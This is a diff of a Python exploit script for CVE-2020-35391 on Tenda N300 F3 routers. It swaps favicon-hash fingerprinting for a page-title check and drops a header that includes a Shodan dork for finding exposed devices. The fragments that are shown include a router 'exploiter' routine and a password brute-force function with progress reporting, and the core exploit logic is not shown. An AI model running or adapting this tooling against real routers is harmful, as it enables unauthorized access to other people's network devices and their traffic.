@@ -1,33 +1,22 @@
-#!/usr/bin/python3
-
-# Exploit Title: Tenda N300 F3 12.01.01.48 - Malformed HTTP Request Header Processing 
-# Shodan Dork: http.favicon.hash:-2145085239 http.title:"Tenda | LOGIN"
-# Date: 09/03/2023
-# Exploit Author: @h454nsec
-# Github: https://github.com/H454NSec/CVE-2020-35391
-# Vendor Homepage: https://www.tendacn.com/default.html
-# Product Link: https://www.tendacn.com/product/f3.html
-# Version: All
-# Tested on: F3v3.0 Firmware (confirmed)
-# CVE : CVE-2020-35391
-
 import re
-import time
 import os
-import sys
-import argparse
 import base64
 import requests
 import subprocess
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
-from colors import colors
-try:
-    import mmh3
-    import codecs
-except ImportError:
-    print("[!] Install mmh3: pip3 install mmh3")
-    sys.exit()
+colors = {
+    'Color_Off': "\033[0m",
+    'Black': "\033[0;30m",
+    'Red': "\033[0;31m",
+    'Green': "\033[0;32m",
+    'Yellow': "\033[0;33m",
+    'Blue': "\033[0;34m",
+    'Purple': "\033[0;35m",
+    'Cyan': "\033[0;36m",
+    'White': "\033[0;37m"
+}
+
 
 def ip_checker(ip):
     if "/" in ip:
@@ -39,13 +28,14 @@ def ip_checker(ip):
     else:
         return f"http://{ip}"
 
-def is_tenda(ip):
+def is_tenda(ip_port):
     try:
-        response = requests.get(f'{ip}/favicon.ico', timeout=5)
-        favicon = codecs.encode(response.content, "base64")
-        favicon_hash = mmh3.hash(favicon)
-        if favicon_hash == -2145085239:
-            return True
+        response = requests.get(f'http://{ip_port}/', timeout=5)
+        html = response.text
+        m = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
+        if m:
+            title = m.group(1).strip().lower()
+            return 'tenda' in title
         return False
     except Exception as error:
         return False
@@ -86,11 +76,11 @@ def tenda_exploiter(ip):
             return "None"
         else:
             print(f"{colors['Red']}[-]{colors['Yellow']} {ip_address}{colors['Color_Off']}")
-            return False
+            return None
 
     except Exception as error:
         print(error)
-        return False
+        return None
 def tenda_brute(ip, passList):
     print(f"{colors['Blue']}[*]{colors['Color_Off']} Starting brute force attack on {colors['Blue']}Tenda router{colors['Color_Off']}")
     s = requests.Session()
@@ -123,4 +113,4 @@ def tenda_brute(ip, passList):
         else:
             print(f"{colors['Red']}[-]{colors['Yellow']} Failed '{colors['Purple']}{passwd}{colors['Color_Off']}'")
             print(f"{colors['Blue']}[*] {colors['Yellow']}Progress: {colors['Blue']}{(count/len(passList))*100}% ({colors['Green']}{count}/{colors['Cyan']}{len(passList)}){colors['Color_Off']}")
-    return False
+    return None
